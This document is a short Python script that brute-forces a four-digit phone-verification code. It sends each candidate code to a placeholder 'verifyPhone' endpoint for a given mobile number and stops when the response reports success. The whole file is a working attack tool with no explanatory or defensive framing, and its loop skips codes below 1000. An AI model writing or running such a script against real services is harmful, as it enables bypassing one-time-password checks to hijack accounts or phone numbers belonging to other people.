#!/usr/bin/python3

import requests
import os
import json
import sys
import time

# clean screen
os.system("cls")
os.system("clear")

# open session here connect 

session = requests.Session()

start = time.time()

for i in range(1000,9999):
    # loops Guess the numbers
    number = "{:04d}".format(i)
   
    url = "https://sites-here/verifyPhone"
    data = {"data":{"mobileNumber":"00000000000000000","code":number}} # enter number for change
    header = {"Content-Type" : "application/json"}

    request = session.post(url , data=json.dumps(data) , headers=header)
    
    re = request.text
    
    if request.status_code == 200:
        if "success" in re:
            print ("[+] OTP Number "+ str(i) + " success")
            print("took script run on " ,time.time() - start)
            sys.exit(0)
        else: 
             print ("[-] OTP Number "+ str(i) + " Failure")
print("took script run on " ,time.time() - start)        
